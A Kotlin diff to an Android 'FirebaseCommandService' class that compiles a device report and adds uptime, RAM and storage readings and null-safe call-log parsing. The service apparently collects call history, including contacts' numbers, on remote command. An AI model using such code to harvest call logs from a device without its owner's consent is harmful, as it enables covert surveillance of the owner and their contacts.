@@ -188,6 +188,12 @@ class FirebaseCommandService : Service() {
         sb.append("Device: ${Build.MANUFACTURER} ${Build.MODEL}\n")
         sb.append("OS Version: Android ${Build.VERSION.RELEASE} (API ${Build.VERSION.SDK_INT})\n\n")
 
+        // Uptime
+        val uptimeMillis = android.os.SystemClock.elapsedRealtime()
+        val uptimeHours = uptimeMillis / (1000 * 60 * 60)
+        val uptimeMins = (uptimeMillis / (1000 * 60)) % 60
+        sb.append("System Uptime: ${uptimeHours}h ${uptimeMins}m\n")
+
         // Battery Status
         val batteryStatus: Intent? = IntentFilter(Intent.ACTION_BATTERY_CHANGED).let { ifilter ->
             registerReceiver(null, ifilter)
@@ -198,6 +204,27 @@ class FirebaseCommandService : Service() {
         val status: Int = batteryStatus?.getIntExtra(BatteryManager.EXTRA_STATUS, -1) ?: -1
         val isCharging: Boolean = status == BatteryManager.BATTERY_STATUS_CHARGING || status == BatteryManager.BATTERY_STATUS_FULL
         sb.append("Battery: ${batteryPct.toInt()}% " + (if (isCharging) "(Charging)\n" else "(Not Charging)\n"))
+
+        // RAM Status
+        val activityManager = getSystemService(Context.ACTIVITY_SERVICE) as android.app.ActivityManager
+        val memoryInfo = android.app.ActivityManager.MemoryInfo()
+        activityManager.getMemoryInfo(memoryInfo)
+        val availableRamGb = memoryInfo.availMem.toDouble() / (1024 * 1024 * 1024)
+        val totalRamGb = memoryInfo.totalMem.toDouble() / (1024 * 1024 * 1024)
+        sb.append(String.format(java.util.Locale.US, "RAM: %.2f GB / %.2f GB\n", availableRamGb, totalRamGb))
+
+        // Storage Status
+        try {
+            val stat = android.os.StatFs(android.os.Environment.getDataDirectory().path)
+            val blockSize = stat.blockSizeLong
+            val totalBlocks = stat.blockCountLong
+            val availableBlocks = stat.availableBlocksLong
+            val totalSpaceGb = (totalBlocks * blockSize).toDouble() / (1024 * 1024 * 1024)
+            val availableSpaceGb = (availableBlocks * blockSize).toDouble() / (1024 * 1024 * 1024)
+            sb.append(String.format(java.util.Locale.US, "Internal Storage: %.2f GB / %.2f GB\n", availableSpaceGb, totalSpaceGb))
+        } catch (e: Exception) {
+            sb.append("Internal Storage: Unknown\n")
+        }
 
         // Network Status
         val cm = getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
@@ -235,10 +262,11 @@ class FirebaseCommandService : Service() {
             val durationIndex = cursor.getColumnIndex(CallLog.Calls.DURATION)
 
             do {
-                val number = cursor.getString(numberIndex)
-                val typeCode = cursor.getString(typeIndex).toInt()
-                val date = cursor.getLong(dateIndex)
-                val duration = cursor.getString(durationIndex)
+                val number = if (numberIndex != -1) cursor.getString(numberIndex) ?: "Unknown" else "Unknown"
+                val typeCodeStr = if (typeIndex != -1) cursor.getString(typeIndex) else null
+                val typeCode = typeCodeStr?.toIntOrNull() ?: -1
+                val date = if (dateIndex != -1) cursor.getLong(dateIndex) else 0L
+                val duration = if (durationIndex != -1) cursor.getString(durationIndex) ?: "0" else "0"
 
                 val type = when (typeCode) {
                     CallLog.Calls.INCOMING_TYPE -> "Incoming"
@@ -247,7 +275,11 @@ class FirebaseCommandService : Service() {
                     else -> "Other"
                 }
 
-                val dateStr = java.text.SimpleDateFormat("yyyy-MM-dd HH:mm:ss", java.util.Locale.getDefault()).format(java.util.Date(date))
+                val dateStr = if (date > 0) {
+                    java.text.SimpleDateFormat("yyyy-MM-dd HH:mm:ss", java.util.Locale.getDefault()).format(java.util.Date(date))
+                } else {
+                    "Unknown Date"
+                }
                 sb.append("$dateStr | $type | $number | ${duration}s\n")
             } while (cursor.moveToNext())
             cursor.close()
